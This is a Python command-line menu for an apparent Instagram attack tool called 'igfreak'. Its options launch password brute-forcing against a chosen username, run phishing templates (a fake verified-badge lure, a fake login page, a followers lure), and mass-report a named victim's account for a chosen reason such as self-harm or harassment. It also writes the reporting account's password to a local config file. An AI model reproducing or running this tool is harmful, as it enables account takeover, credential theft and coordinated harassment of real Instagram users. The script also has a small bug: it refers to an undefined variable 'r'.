BL = '\033[30m'
B = '\033[94m'
C = '\033[96m'
D = '\033[36m'
G = '\033[92m'
P = '\033[95m'
R = '\033[91m'
Y= '\033[93m'
W = '\033[37m'
import os
import sys
	
def printBox(str):
	a = len(str)
	C=r
	print(f'{C}╔═{a*"═"}═╗\n║ {G+str} {C}║\n╚═{a*"═"}═╝')	
def error(error_str):
        print(f"{B}[{Y}Error{B}] {R+error_str} ")
        sys.exit(2)
def error1(error_str):
        print(f"{B}[{Y}Error{B}] {R+error_str} ")
def ask(str):
        a = input(f"{B}[{R}  ?  {B}]{C} {str} {G} ")
        return a
try:
	import igfreak
except ModuleNotFoundError:
	error("Unable to import IgFreak")
from igfreak import *
def cls():
	os.system('clear')
def res():
	a = ask("Do you want to restart [y/n] : ")
	if a == "y":
		main()
	else:
		sys.exit(0)
def main():
	cls()
	print(logo)
	printBox("Choose above options")
	print(f"""
	{C}[{W}1{C}] {Y}Bruteforce
	{C}[{W}2{C}] {Y}Phishing
	{C}[{W}3{C}] {Y}Report\n
	{C}[{W}%{C}] {G}Change Report Account
	{C}[{W}>{C}] {G}Update Tool
	{C}[{W}*{C}] {G}Donate
	{C}[{W}${C}] {G}Report Bugs
	""")
	option = ask(">>")
	print("")
	if  option == "1":
		os.system("clear")
		print(logo)
		username = ask("Enter username ")
		passlist = ask("Enter passlist location")
		print()
		os.system(f"python3 igfreak.py --bruteforce -u {username} -pl {passlist} ")
		res()
	if option == "2":
		des = f"""{G}Template      Description{W}
    			
[1] {B}igbadges       : {W}Hack account by confirming account in get verified badges
[2] {B}instagram      : {W}Instagram simple login page 
[3] {B}instafollowers : {W}Get Instagram accounts by seeking followers
"""
		print(des)
		ohh = ask("Enter name of phishing templates [1/2/3] >>")
		if ohh == "1":
		
			os.system(f"python3 igfreak.py --phish -t igbadges ")
			res()
		elif ohh == "2":
			os.system("python3 igfreak.py --phish -t instagram")
			res()
		else:
			os.system("python3 igfreak.py --phish -t instafollowers ")
			res()
	elif option == "3":
		os.system('clear')
		print(logo)
		ids = f"""
{G}Choose the type of report :
{C}	

[1] - Spam
[2] - Violence
[3] - Impersonation
[4] - Sexual activity
[5] - Harassment
[6] - Self-harm
[7] - Hate on

"""
		print(ids)
		xx = ask("Enter the id of report reason >>")
		username = ask("Enter the victims report id >>")
		t = ask("Enter the number of reports >> ")
		os.system(f"python3 igfreak.py --report -u {username} -am {t} -id {xx}")
		res()
	elif option == "%":
		account = ask("Enter the reporting account >>>")
		passw = ask("Enter the reporting password >>>")
		text = f"""
igfreak_report_account = "{account}" 
igfreak_report_account_pass = '{passw}' 
"""
		filo = open(".igfreak.conf","w")
		filo.writelines(text)
		filo.close()
		res()
	else:
		error1("Wrong option")
		res()
	res()
main()